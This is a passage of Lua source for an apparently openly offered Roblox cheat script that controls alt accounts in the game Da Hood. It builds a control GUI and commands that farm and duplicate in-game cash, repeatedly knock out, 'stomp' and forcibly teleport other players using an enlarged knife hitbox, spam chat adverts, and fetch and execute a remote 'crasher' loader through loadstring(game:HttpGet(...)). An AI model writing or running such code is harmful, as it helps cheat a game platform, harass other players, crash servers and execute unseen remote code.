		Options.Size = UDim2.new(0.25, 0, 0.2, 0)
		Options.Parent = Background
		DropFrame.Name = "DropFrame"
		DropFrame.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		DropFrame.AnchorPoint = Vector2.new(0.5, 0.5)
		DropFrame.BackgroundTransparency = 1
		DropFrame.Position = UDim2.new(0.25, 0, 0.5, 0)
		DropFrame.BackgroundColor3 = Color3.new(1, 1, 1)
		DropFrame.Size = UDim2.new(0.174, 0, 0.5, 0)
		DropFrame.Parent = Options
		DroppingTitle.Name = "DroppingTitle"
		DroppingTitle.TextStrokeTransparency = 0.75
		DroppingTitle.Size = UDim2.new(1, 0, 0.3, 0)
		DroppingTitle.TextColor3 = Color3.new(1, 1, 1)
		DroppingTitle.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		DroppingTitle.Text = "Dropping"
		DroppingTitle.TextSize = 14
		DroppingTitle.Font = Enum.Font.SourceSans
		DroppingTitle.BackgroundTransparency = 1
		DroppingTitle.TextScaled = true
		DroppingTitle.BackgroundColor3 = Color3.new(1, 1, 1)
		DroppingTitle.Parent = DropFrame
		DropBtn.Name = "DropBtn"
		DropBtn.TextStrokeTransparency = 0
		DropBtn.Size = UDim2.new(1, 0, 0.699, 0)
		DropBtn.TextColor3 = Color3.new(1, 1, 1)
		DropBtn.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		DropBtn.Text = "Off"
		DropBtn.TextSize = 14
		DropBtn.Font = Enum.Font.SourceSans
		DropBtn.Position = UDim2.new(0, 0, 0.3, 0)
		DropBtn.TextScaled = true
		DropBtn.BackgroundColor3 = Color3.new(1, 0, 0)
		DropBtn.Parent = DropFrame
		DropTime.Name = "DropTime"
		DropTime.TextStrokeTransparency = 0.75
		DropTime.Size = UDim2.new(1, 0, 0.3, 0)
		DropTime.TextColor3 = Color3.new(1, 1, 1)
		DropTime.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		DropTime.Text = "0"
		DropTime.Visible = false
		DropTime.TextSize = 14
		DropTime.Font = Enum.Font.SourceSans
		DropTime.BackgroundTransparency = 1
		DropTime.Position = UDim2.new(0, 0, 1, 0)
		DropTime.TextScaled = true
		DropTime.BackgroundColor3 = Color3.new(1, 1, 1)
		DropTime.Parent = DropFrame
		CashAuraFrame.Name = "CashAuraFrame"
		CashAuraFrame.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		CashAuraFrame.AnchorPoint = Vector2.new(0.5, 0.5)
		CashAuraFrame.BackgroundTransparency = 1
		CashAuraFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
		CashAuraFrame.BackgroundColor3 = Color3.new(1, 1, 1)
		CashAuraFrame.Size = UDim2.new(0.174, 0, 0.5, 0)
		CashAuraFrame.Parent = Options
		CashAuraTitle.Name = "CashAuraTitle"
		CashAuraTitle.TextStrokeTransparency = 0.75
		CashAuraTitle.Size = UDim2.new(1, 0, 0.3, 0)
		CashAuraTitle.TextColor3 = Color3.new(1, 1, 1)
		CashAuraTitle.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		CashAuraTitle.Text = "Cash Aura"
		CashAuraTitle.TextSize = 14
		CashAuraTitle.Font = Enum.Font.SourceSans
		CashAuraTitle.BackgroundTransparency = 1
		CashAuraTitle.TextScaled = true
		CashAuraTitle.BackgroundColor3 = Color3.new(1, 1, 1)
		CashAuraTitle.Parent = CashAuraFrame
		CashAuraBtn.Name = "CashAuraBtn"
		CashAuraBtn.TextStrokeTransparency = 0
		CashAuraBtn.Size = UDim2.new(1, 0, 0.699, 0)
		CashAuraBtn.TextColor3 = Color3.new(1, 1, 1)
		CashAuraBtn.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		CashAuraBtn.Text = "Off"
		CashAuraBtn.TextSize = 14
		CashAuraBtn.Font = Enum.Font.SourceSans
		CashAuraBtn.Position = UDim2.new(0, 0, 0.3, 0)
		CashAuraBtn.TextScaled = true
		CashAuraBtn.BackgroundColor3 = Color3.new(1, 0, 0)
		CashAuraBtn.Parent = CashAuraFrame
		FpsLockFrame.Name = "FpsLockFrame"
		FpsLockFrame.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		FpsLockFrame.AnchorPoint = Vector2.new(0.5, 0.5)
		FpsLockFrame.BackgroundTransparency = 1
		FpsLockFrame.Position = UDim2.new(0.75, 0, 0.5, 0)
		FpsLockFrame.BackgroundColor3 = Color3.new(1, 1, 1)
		FpsLockFrame.Size = UDim2.new(0.174, 0, 0.5, 0)
		FpsLockFrame.Parent = Options
		FpsLockTitle.Name = "FpsLockTitle"
		FpsLockTitle.TextStrokeTransparency = 0.75
		FpsLockTitle.Size = UDim2.new(1, 0, 0.3, 0)
		FpsLockTitle.TextColor3 = Color3.new(1, 1, 1)
		FpsLockTitle.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		FpsLockTitle.Text = "FPS Lock"
		FpsLockTitle.TextSize = 14
		FpsLockTitle.Font = Enum.Font.SourceSans
		FpsLockTitle.BackgroundTransparency = 1
		FpsLockTitle.TextScaled = true
		FpsLockTitle.BackgroundColor3 = Color3.new(1, 1, 1)
		FpsLockTitle.Parent = FpsLockFrame
		FpsLockBox.Name = "FpsLockBox"
		FpsLockBox.TextStrokeTransparency = 0.75
		FpsLockBox.Size = UDim2.new(1, 0, 0.699, 0)
		FpsLockBox.TextColor3 = Color3.new(1, 1, 1)
		FpsLockBox.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		FpsLockBox.Text = "3"
		FpsLockBox.TextSize = 14
		FpsLockBox.Font = Enum.Font.SourceSans
		FpsLockBox.BackgroundTransparency = 0.800000011920929
		FpsLockBox.Position = UDim2.new(0, 0, 0.3, 0)
		FpsLockBox.ClearTextOnFocus = false
		FpsLockBox.TextScaled = true
		FpsLockBox.BackgroundColor3 = Color3.new(1, 1, 1)
		FpsLockBox.Parent = FpsLockFrame
		TakeControlBtn.Name = "TakeControlBtn"
		TakeControlBtn.TextStrokeTransparency = 0
		TakeControlBtn.AnchorPoint = Vector2.new(0.5, 0)
		TakeControlBtn.Size = UDim2.new(0.349, 0, 0.2, 0)
		TakeControlBtn.TextColor3 = Color3.new(1, 1, 1)
		TakeControlBtn.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		TakeControlBtn.Text = "Take Control of Alt"
		TakeControlBtn.TextSize = 14
		TakeControlBtn.Font = Enum.Font.SourceSans
		TakeControlBtn.Position = UDim2.new(0.5, 0, 1, 0)
		TakeControlBtn.TextScaled = true
		TakeControlBtn.BackgroundColor3 = Color3.new(0.192157, 0.192157, 0.192157)
		TakeControlBtn.Parent = Options
		Help.Name = "Help"
		Help.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		Help.AnchorPoint = Vector2.new(0, 1)
		Help.BackgroundTransparency = 1
		Help.Position = UDim2.new(0, 0, 1, 0)
		Help.BackgroundColor3 = Color3.new(1, 1, 1)
		Help.Size = UDim2.new(0.25, 0, 0.5, 0)
		Help.Parent = Background
		HelpButton.Name = "HelpButton"
		HelpButton.TextStrokeTransparency = 0.75
		HelpButton.Size = UDim2.new(0.15, 0, 0.15, 0)
		HelpButton.TextColor3 = Color3.new(1, 1, 1)
		HelpButton.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		HelpButton.Text = "Help"
		HelpButton.TextSize = 14
		HelpButton.Font = Enum.Font.SourceSans
		HelpButton.BackgroundTransparency = 0.949999988079071
		HelpButton.Position = UDim2.new(0, 0, 0.85, 0)
		HelpButton.TextScaled = true
		HelpButton.BackgroundColor3 = Color3.new(1, 1, 1)
		HelpButton.Parent = Help
		HelpFrame.Name = "HelpFrame"
		HelpFrame.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		HelpFrame.Visible = false
		HelpFrame.AnchorPoint = Vector2.new(0, 1)
		HelpFrame.BackgroundTransparency = 0.949999988079071
		HelpFrame.Position = UDim2.new(0, 0, 0.85, 0)
		HelpFrame.BackgroundColor3 = Color3.new(1, 1, 1)
		HelpFrame.Size = UDim2.new(1, 0, 0.6, 0)
		HelpFrame.Parent = Help
		HelpText.Name = "HelpText"
		HelpText.TextTransparency = 0.25
		HelpText.TextStrokeTransparency = 0.8999999761581421
		HelpText.Size = UDim2.new(1, 0, 1, 0)
		HelpText.TextColor3 = Color3.new(1, 1, 1)
		HelpText.TextXAlignment = Enum.TextXAlignment.Left
		HelpText.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		HelpText.Text = "You are seeing this screen because it saves CPU usage. Connect to the server on your main account to control this and any other alts from the BDH Gui!"
		HelpText.TextSize = 14
		HelpText.Font = Enum.Font.SourceSans
		HelpText.BackgroundTransparency = 1
		HelpText.TextYAlignment = Enum.TextYAlignment.Top
		HelpText.TextScaled = true
		HelpText.BackgroundColor3 = Color3.new(1, 1, 1)
		HelpText.Parent = HelpFrame
		CrasherFrame.Name = "CrasherFrame"
		CrasherFrame.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		CrasherFrame.AnchorPoint = Vector2.new(0.5, 0.5)
		CrasherFrame.BackgroundTransparency = 0.949999988079071
		CrasherFrame.Position = UDim2.new(0.666, 0, 0.4, 0)
		CrasherFrame.BackgroundColor3 = Color3.new(1, 1, 1)
		CrasherFrame.Size = UDim2.new(0.25, 0, 0.349, 0)
		CrasherFrame.Parent = Background

		--Secondary instances
		local secondaryInsts = {{["ClassName"] = "UICorner", ["Parent"] = RecountFloorCash, ["Properties"] = {}},{["ClassName"] = "UICorner", ["Parent"] = DestroyFloorCash, ["Properties"] = {}},{["ClassName"] = "UICorner", ["Parent"] = Info, ["Properties"] = {["CornerRadius"] = UDim.new(0.05, 0),}},{["ClassName"] = "UICorner", ["Parent"] = Options, ["Properties"] = {["CornerRadius"] = UDim.new(0.05, 0),}},{["ClassName"] = "UICorner", ["Parent"] = DropBtn, ["Properties"] = {}},{["ClassName"] = "UICorner", ["Parent"] = CashAuraBtn, ["Properties"] = {}},{["ClassName"] = "UICorner", ["Parent"] = TakeControlBtn, ["Properties"] = {}},{["ClassName"] = "UICorner", ["Parent"] = CrasherFrame, ["Properties"] = {["CornerRadius"] = UDim.new(0.05, 0),}},}
		for _, instInfo in ipairs(secondaryInsts) do
			local inst = Instance.new(instInfo.ClassName)
			for propertyName, value in pairs(instInfo.Properties) do
				inst[propertyName] = value
			end
			inst.Parent = instInfo.Parent
		end
	end)();

    --
    --
    --Create manual control Gui
    local ManualGui = Instance.new("ScreenGui")
    local ReturnControlBtn = Instance.new("TextButton")
    local UICorner = Instance.new("UICorner")

    ManualGui.Name = "ManualGui"
    ManualGui.Parent = CORE_GUI
    ManualGui.DisplayOrder = 1
    ManualGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    ReturnControlBtn.Name = "ReturnControlBtn"
    ReturnControlBtn.Parent = ManualGui
    ReturnControlBtn.AnchorPoint = Vector2.new(0.5, 0.5)
    ReturnControlBtn.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
    ReturnControlBtn.Position = UDim2.new(0.5, 0, 0.75, 0)
    ReturnControlBtn.Size = UDim2.new(0.100000001, 0, 0.0500000007, 0)
    ReturnControlBtn.Font = Enum.Font.SourceSans
    ReturnControlBtn.Text = "Return"
    ReturnControlBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    ReturnControlBtn.TextScaled = true
    ReturnControlBtn.TextSize = 14.000
    ReturnControlBtn.TextStrokeTransparency = 0.000
    ReturnControlBtn.TextWrapped = true

    UICorner.Parent = ReturnControlBtn

    --Vars
    local playerOldPosition
    local cleanupConnections = {} -- [character] = cleanupConnection
    local loopkillToggle = false
    local destroyCash = false
    local dropToggle = false

    --Create feetPlatform (parent it to workspace after optimisation is complete
    local feetPlatform = Instance.new("Part")
    feetPlatform.Anchored = true
    feetPlatform.Position = Vector3.new(0, 0, 0)
    feetPlatform.Size = Vector3.new(5, 0.5, 5)

    --Functions
    local function capFps(amount)
        if not amount then amount = 3 end
        FpsLockBox.Text = amount

        --RunService:setThrottleFramerateEnabled(true)
        setfpscap(amount)
    end
    local function uncapFps(amount)
        if not amount then amount = 30 end
        FpsLockBox.Text = amount

        --RunService:setThrottleFramerateEnabled(false)
        setfpscap(amount)
    end

    local cleanedItems = {}
    local function cleanupItem(item)
        if cleanedItems[item] == nil and item:IsA("Tool") then
            task.wait(2)
            for _, descendant in ipairs(item:GetDescendants()) do
                if descendant:IsA("BasePart") then
                    descendant.Transparency = 1
                    descendant.Material = Enum.Material.SmoothPlastic
                    if descendant:IsA("MeshPart") then
                        descendant.MeshId = ""
                        descendant.TextureID = ""
                    end
                elseif descendant:IsA("Decal") then
                    descendant.Transparency = 1
                elseif descendant:IsA("BillboardGui") then
                    descendant.Enabled = false
                elseif descendant:IsA("TextLabel") then
                    descendant.Visible = false
                elseif descendant:IsA("Sound") then
                    descendant.SoundId = ""
                elseif descendant:IsA("Mesh") then
                    descendant.MeshId = ""
                    descendant.TextureID = ""
                end
            end
            cleanedItems[item] = true
        end

        --If it's a can, make sure it's parented to character
        --while item.Parent == nil do task.wait() end
        --if item.Name == "[SprayCan]" and item.Parent == PLAYER.Backpack then
        --    item.Parent = PLAYER.Character
        --end
    end

    local function teleport(cframeLocation)
        PLAYER.Character.HumanoidRootPart.CFrame = cframeLocation
        feetPlatform.Position = PLAYER.Character.HumanoidRootPart.Position + Vector3.new(0, -3, 0)
    end

    local function koPlayer(characterToKO)
        local knife = PLAYER.Backpack:FindFirstChild("[Knife]") or PLAYER.Character:FindFirstChild("[Knife]")

        --Buy knife if you don't have one
        local knifeShop = IGNORED.Shop["[Knife] - $155"]
        while not knife do
            PLAYER.Character.HumanoidRootPart.CFrame = knifeShop.Head.CFrame + Vector3.new(0, 3, 0)
            if PLAYER:DistanceFromCharacter(knifeShop.Head.Position) < knifeShop.ClickDetector.MaxActivationDistance then
                fireclickdetector(knifeShop.ClickDetector)
            end
            task.wait(0.1)
            while not isCharacterLoaded(PLAYER) do task.wait() end
            knife = PLAYER.Backpack:FindFirstChild("[Knife]")
        end

        --Setup knife
        knife:WaitForChild("Handle").Size = Vector3.new(50, 50, 50)
        knife.Parent = PLAYER.Character
        
        while isCharacterLoaded(Players:GetPlayerFromCharacter(characterToKO)) and isCharacterLoaded(PLAYER) and characterToKO.BodyEffects["K.O"].Value == false do
            PLAYER.Character.HumanoidRootPart.CFrame = CFrame.new(characterToKO.HumanoidRootPart.Position + Vector3.new(0, -10, 0))
            knife:Activate()
            task.wait()
        end
    end

    --Alt commands
    local altCommands = {}
    --local crouchAnim = PLAYER.Character.Humanoid:LoadAnimation(game.ReplicatedStorage.ClientAnimations.Block)
    altCommands.drop = function(player, args)
        if DropBtn.Text == "On" then
            MAIN_EVENT:FireServer("Block", false) -- (doesn't work if stuff in IGNORED is destroyed idk why)
            CHAT_EVENT:FireServer("Stopped Dropping", "All")
            updateMousePosWithDebounce(Vector3.new(0, 10000, 50000))
            DropBtn.Text = "Off"
            DropBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        else
            MAIN_EVENT:FireServer("Block", true)
            CHAT_EVENT:FireServer("Started Dropping", "All")
            updateMousePosWithDebounce(Vector3.new(1, 10000, 50000))
            DropBtn.Text = "On"
            DropBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        end

        dropToggle = not dropToggle

        task.spawn(function()
            if PLAYER_CASH.Value < 150000 then
                CHAT_EVENT:FireServer("Can't drop with < 150k", "All")
            end

            while dropToggle == true and PLAYER_CASH.Value >= 150000 do --currency
                MAIN_EVENT:FireServer("DropMoney", 10000)
                DropTime.Visible = true
                for count = 15, 1, -1 do
                    if dropToggle == true then
                        DropTime.Text = count.."s"
                        task.wait(1)
                    else
                        break
                    end
                end
                task.wait(0.15)
            end
            DropTime.Visible = false
            DropBtn.Text = "Off"
            DropBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

            MAIN_EVENT:FireServer("Block", false) -- (doesn't work if stuff in IGNORED is destroyed idk why)
            updateMousePosWithDebounce(Vector3.new(0, 10000, 50000))
        end)
    end

    local currencyPostFixes = {
        ["k"] = 1000,
        ["m"] = 1000000,
        ["b"] = 1000000000,
    }
    altCommands.cdrop = function(player, args)
        if destroyCash == false then
            local amountString = args[1]
            local limit = tonumber(amountString)
            if not limit then
                for postFix, value in pairs(currencyPostFixes) do
                    if string.find(amountString, postFix) then
                        local rawNumberString = string.gsub(amountString, postFix, "")
                        local amountNumber = tonumber(rawNumberString)
                        limit = amountNumber * value
                        break
                    end
                end
            end
    
            if limit then
                altCommands.drop()
                while countFloorCash() < limit do task.wait(1) end
                dropToggle = false
                CHAT_EVENT:FireServer("Finished .cdrop!", "All")
            end
        else
            CHAT_EVENT:FireServer("Cash is destroyed, cannot .cdrop", "All")
        end
    end

    altCommands.dropped = function(player, args)
        CHAT_EVENT:FireServer("Cash on floor: $"..commaValue(countFloorCash()), "All")
    end

    altCommands.fps = function(player, args)
        local fpsInputAmount = tonumber(args[1])
        if fpsInputAmount then
            capFps(fpsInputAmount)
        end
    end

    altCommands.aura = function(player, args)
        local playerToCheck = findPlayer(args[1])

        if playerToCheck == PLAYER then
            if CashAuraBtn.Text == "On" then
                CashAuraBtn.Text = "Off"
                CashAuraBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                updateMousePosWithDebounce(Vector3.new(0, 20000, 50000))
            elseif CashAuraBtn.Text == "Off" then
                CashAuraBtn.Text = "On"
                CashAuraBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
                updateMousePosWithDebounce(Vector3.new(1, 20000, 50000))
                CHAT_EVENT:FireServer("CashAura Turned On!", "All")
    
                task.spawn(function()
                    while CashAuraBtn.Text == "On" do
                        for _,v in ipairs(workspace.Ignored.Drop:GetChildren()) do
                            if v:IsA("Part") and PLAYER:DistanceFromCharacter(v.Position) < 12 then
                                fireclickdetector(v.ClickDetector)
                                task.wait(0.1)
                            end
                        end
                        task.wait(0.1)
                    end
                end)
            end
        end
    end

    altCommands.dupefor = function(player, args)
        local playerToDupeFor = findPlayer(args[1])

        if playerToDupeFor then
            if PLAYER == playerToDupeFor then
                altCommands.aura(nil, {PLAYER.Name})
            else
                teleport(CFrame.new(playerToDupeFor.Character.HumanoidRootPart.Position + Vector3.new(math.random(70) / 10 - 3.5, -5, math.random(70) / 10 - 3.5)))
                altCommands.drop()
            end
        end
    end

    altCommands.redeem = function(player, args)
        local code = tostring(args[1])

        if code then
            MAIN_EVENT:FireServer("EnterPromoCode", code)
        end
    end

    altCommands.stop = function(player, args)
        dropToggle = false

        updateMousePosWithDebounce(Vector3.new(0, 20000, 50000))
        CashAuraBtn.Text = "Off"
        CashAuraBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

        CHAT_EVENT:FireServer("Stopped", "All")

        loopkillToggle = false
    end

    altCommands.destroycash = function(player, args)
        LPH_JIT_MAX(function()
            for _,v in ipairs(IGNORED.Drop:GetChildren()) do
                if v:IsA("Part") then
                    v:Destroy()
                end
            end
        end)();
        destroyCash = true
        DestroyFloorCash.Visible = false
        RecountFloorCash.Visible = false
        TotalFloorCash.Text = "Cash on the floor - <font color='rgb(0,255,0)'>N/A</font>"
        CHAT_EVENT:FireServer("Cash Destroyed", "All")
    end

    altCommands.setup = function(player, args)
        local locationName = tostring(args[1]) -- tostring incase nil
        local ogPlacement = tostring(args[2]) == "og" and true or false

        if not ogPlacement then
            while not isCharacterLoaded(PLAYER) do task.wait() end
            local altNumber = getAltNumber(PLAYER.UserId)
            teleport(CFrame.new(ALT_SETUP_LOCATIONS_V2[locationName][altNumber]))
        elseif ogPlacement == true then
            if ALT_SETUP_LOCATIONS_OG[locationName] then
                while not isCharacterLoaded(PLAYER) do task.wait() end
                local initialPosition = ALT_SETUP_LOCATIONS_OG[locationName]
                local altNumber = getAltNumber(PLAYER.UserId)

                if altNumber > 9 then
                    local firstDigit = tonumber(string.sub(tostring(altNumber), 1, 1))
                    local lastDigit = math.floor(altNumber%10)
        
                    teleport(CFrame.new(initialPosition + Vector3.new((firstDigit*10) / 2, 0, (lastDigit*10) / 2)))
                else
                    local lastDigit = math.floor(altNumber%10)
    
                    teleport(CFrame.new(initialPosition + Vector3.new(0, 0, (lastDigit*10) / 2)))
                end
            elseif locationName == "host" then
                teleport(player.Character.HumanoidRootPart.CFrame)
            end
        end
    end

    altCommands.freeze = function(player, args)
        local playerToFreeze = findPlayer(args[1])

        if playerToFreeze == PLAYER or args[1] == nil then
            PLAYER.Character.HumanoidRootPart.Anchored = true
        end
    end

    altCommands.unfreeze = function(player, args)
        local playerToFreeze = findPlayer(args[1])

        if playerToFreeze == PLAYER or args[1] == nil then
            PLAYER.Character.HumanoidRootPart.Anchored = false
        end
    end

    altCommands.wallet = function(player, args)
        --Un-equip all other tools
        for _, v in pairs(player.Character:GetChildren()) do
            if v:IsA("Tool") and v.Name ~= "Wallet" then
                v.Parent = player.Backpack
            end
        end

        --Equip/un-equip wallet
        if PLAYER.Backpack:FindFirstChild("Wallet") then
            PLAYER.Backpack.Wallet.Parent = PLAYER.Character
        elseif PLAYER.Character:FindFirstChild("Wallet") then
            PLAYER.Character.Wallet.Parent = PLAYER.Backpack
        end
    end


    local advertising = false
    altCommands.advert = function(player, args)
        local message = constructMessage(args, 1)

        if message then
            advertising = not advertising
            task.spawn(function()
                while advertising == true do
                    --Players:Chat(message)
                    CHAT_EVENT:FireServer(message, "All")
                    task.wait(10)
                end
            end)
        end
    end

    altCommands.say = function(player, args)
        local message = constructMessage(args, 1)

        if message then
            CHAT_EVENT:FireServer(message, "All")
        end
    end

    altCommands.joincrew = function(player, args)
        local crewId = tonumber(args[1])

        if crewId then
            MAIN_EVENT:FireServer("JoinCrew", crewId)
        else
            local crewId = GroupService:GetGroupsAsync(PLAYER.UserId)[1].Id
            MAIN_EVENT:FireServer("JoinCrew", crewId)
        end
    end

    altCommands.loop = function(player, args)
        if getgenv().alts[1] == PLAYER.UserId then
            local playerToStomp = findPlayer(args[1])
            if playerToStomp then
                local character = PLAYER.Character
        
                --Unfreeze if frozen
                PLAYER.Character.HumanoidRootPart.Anchored = false

                loopkillToggle = not loopkillToggle
        
                local originalPosition = character.HumanoidRootPart.CFrame
        
                while playerToStomp and loopkillToggle == true do
                    pcall(function()
                        --Knock out player
                        koPlayer(playerToStomp.Character)
        
                        while playerToStomp.Character.BodyEffects["K.O"].Value == true do
                            character.HumanoidRootPart.CFrame = CFrame.new(playerToStomp.Character.UpperTorso.Position + Vector3.new(0, 3, 0))
                            MAIN_EVENT:FireServer("Stomp", false)
                            task.wait()
                        end
                    end)
                    task.wait()
                end

                teleport(originalPosition)
            end
        end
    end

    altCommands.airlock = function(player, args)
        teleport(CFrame.new(PLAYER.Character.HumanoidRootPart.Position + Vector3.new(0, 10, 0)))
    end

    altCommands.hide = function(player, args)
        teleport(CFrame.new(PLAYER.Character.HumanoidRootPart.Position + Vector3.new(0, -6.5, 0)))
    end

    altCommands.hidecash = function(player, args)
        if args[1] then
            if args[1] == "on" then
                hideCash = true
            elseif args[1] == "off" then
                hideCash = false
            end
        else
            hideCash = not hideCash
        end

        LPH_JIT_MAX(function()
            if hideCash == true then
                for _, v in pairs(IGNORED.Drop:GetChildren()) do
                    if v:IsA("Part") then
                        if v:FindFirstChild("Decal") then
                            v.Decal:Destroy()
                            v.Decal:Destroy()
                        end
                        v.BillboardGui.Enabled = false
                        v.Transparency = 1
                    end
                end
            else
                for _, v in pairs(IGNORED.Drop:GetChildren()) do
                    if v:IsA("Part") then
                        v.BillboardGui.Enabled = true
                        v.Transparency = 0
                    end
                end
            end
        end)();
    end

    altCommands.bring = function(player, args)
        local playerToBring = findPlayer(args[1])
        local character = PLAYER.Character

        if playerToBring then
            if playerToBring == PLAYER then
                teleport(CFrame.new(player.Character.HumanoidRootPart.Position + Vector3.new(0, 3, 0)))
            elseif not isAlt(playerToBring.UserId) and getgenv().alts[1] == PLAYER.UserId then
                local originalPosition = character.HumanoidRootPart.CFrame

                --Unfreeze if frozen
                PLAYER.Character.HumanoidRootPart.Anchored = false

                --Knock out player
                koPlayer(playerToBring.Character)

                --Grab player
                task.spawn(function()
                    while character.BodyEffects.Grabbed.Value == nil do
                        if playerToBring.Character.BodyEffects["K.O"].Value == false then koPlayer(playerToBring.Character) end --make sure player is KOed
                        character.HumanoidRootPart.CFrame = CFrame.new(playerToBring.Character.UpperTorso.Position + Vector3.new(0, 5, 0))
                        task.wait()
                    end
                end)
                while character.BodyEffects.Grabbed.Value == nil do
                    MAIN_EVENT:FireServer("Grabbing", false)
                    task.wait(0.6)
                    task.wait()
                end

                --Teleport to player, feetPlatform so they don't fall through floor, and wait to sync
                teleport(CFrame.new(player.Character.HumanoidRootPart.Position + Vector3.new(0, 3, 0)))
                task.wait(1)
                task.wait()

                --Drop and wait for them to fall
                MAIN_EVENT:FireServer("Grabbing", false)
                task.wait(1)
                task.wait()

                --Teleport back
                teleport(originalPosition)

                --Un-equip knife
                if character:FindFirstChild("[Knife]") then
                    character["[Knife]"].Parent = PLAYER.Backpack
                end
            end
        end
    end

    altCommands.line = function(player, args)
        teleport(CFrame.new(player.Character.HumanoidRootPart.Position + Vector3.new(getAltNumber(PLAYER.UserId)*2 - 1, 3, 0)))
    end

    --[[
    --PATCHED
    altCommands.fastcrash = function(player, args)
        if fastCrashing == false then
            startStopTimer(true)
            fastCrashing = true
            FastCrash.Text = "Crashing..."
            FastCrash.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

            uncapFps(60)

            local character = PLAYER.Character
            local backpack = PLAYER.Backpack
            local wallet = backpack:FindFirstChild("Wallet") or character.Wallet

            task.spawn(function()
                local count = 0
                while fastCrashing == true do
                    if count < 550 then
                        count += 1
                        wallet.Parent = character
                        wallet.Parent = backpack
                        wallet.Grip = CFrame.new(0.149187073, -0.523812294, 0.427762032, 1, 0, 0, 0, 1, 0, 0, 0, 1)
                    else
                        count = 0
                        task.wait()
                    end
                end
            end)
        elseif fastCrashing == true then
            startStopTimer(false)
            fastCrashing = false
            FastCrash.Text = "Fast Crash (5m)"
            FastCrash.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        end
    end
    --]]

    altCommands.safecrash = function(player, args)
        local playerToSafeCrash = findPlayer(args[1])

        if playerToSafeCrash == PLAYER or getAltNumber(PLAYER.UserId) == 1 then
            print("safe crash")
        end
    end

    altCommands.spraycrash = function(player, args)
        local playerToSprayCrash = findPlayer(args[1])

        if playerToSprayCrash  == PLAYER or getAltNumber(PLAYER.UserId) == 1 then
            print("spray crash")
        end
    end

    --Load crasher
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/25ac460fa4de825b45aba4aedf9a7eee.lua"))()
    --loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodTesters/main/BDHCrashTesters.lua'))()

    --Connect and setup alt ui
    --Display name
    DisplayName.Text = PLAYER.DisplayName
    --Username
    Username.Text = "<i>@"..PLAYER.Name.."</i>"
    --CurrentCash
    CurrentCash.Text = "Cash - <font color='rgb(0,255,0)'>$"..commaValue(PLAYER_CASH.Value).."</font>"
    --StartingCash
    StartingCash.Text = "Joined with - <font color='rgb(0,255,0)'>$"..commaValue(ORIGINAL_CASH_AMOUNT).."</font>"
    --TimeRemaining
    TimeRemaining.Text = convertToHMS(calculateSecondsToDrop(PLAYER_CASH.Value))

    --For already dropped cash
    TotalFloorCash.Text = "Cash on the floor - <font color='rgb(0,255,0)'>$"..commaValue(countFloorCash()).."</font>"

    --Connections
    --Cash added
    IGNORED.Drop.ChildAdded:Connect(function(child)
        if child:IsA("Part") then
            task.wait(5)
            child.Transparency = 1
            child:WaitForChild("Decal"):Destroy()
            child:WaitForChild("Decal"):Destroy()
            child:WaitForChild("BillboardGui").Enabled = false
            if destroyCash == true and child.Parent ~= nil then
                child:Destroy()
            end
        end
    end)

    --Player cash changed
    PLAYER_CASH.Changed:Connect(function(newValue)
        --CurrentCash
        CurrentCash.Text = "Cash - <font color='rgb(0,255,0)'>$"..commaValue(newValue).."</font>"
        --CashGainedLost
        local cashDifference = newValue - ORIGINAL_CASH_AMOUNT
        if cashDifference < 0 then
            CashGainedLost.Text = "Cash lost since join - <font color='rgb(255,0,0)'>-$"..commaValue(math.abs(cashDifference)).."</font>"
        elseif cashDifference > 0 then
            CashGainedLost.Text = "Cash gained since join - <font color='rgb(0,255,0)'>$"..commaValue(cashDifference).."</font>"
        else
            CashGainedLost.Text = "Cash gained/lost since join - <font color='rgb(255,255,255)'>$"..commaValue(cashDifference).."</font>"
        end
        --TimeRemaining
        TimeRemaining.Text = convertToHMS(calculateSecondsToDrop(newValue))
    end)

    --DestroyFloorCash
    DestroyFloorCash.MouseButton1Down:Connect(function()
        altCommands.destroycash()
    end)

    --RecountFloorCash
    RecountFloorCash.MouseButton1Down:Connect(function()
        TotalFloorCash.Text = "Cash on the floor - <font color='rgb(0,255,0)'>$"..commaValue(countFloorCash()).."</font>"
    end)

    --HelpButton
    HelpButton.MouseButton1Down:Connect(function()
        HelpFrame.Visible = not HelpFrame.Visible
    end)

    --DropBtn
    DropBtn.MouseButton1Down:Connect(function()
        altCommands.drop()
    end)

    --CashAuraBtn
    CashAuraBtn.MouseButton1Down:Connect(function()
        altCommands.aura(nil, {PLAYER.Name})
    end)

    --FpsLockBox
    FpsLockBox.FocusLost:Connect(function(enterPressed)
        if enterPressed == true then
            local fpsInput = tonumber(FpsLockBox.Text)
            if fpsInput then
                capFps(fpsInput)
            end
        end
    end)

    --TakeControlBtn
    TakeControlBtn.MouseButton1Down:Connect(function()
        uncapFps(60)
        AltGui.Enabled = false
        PLAYER.Character.HumanoidRootPart.Anchored = false
        cancelVelocity(false)
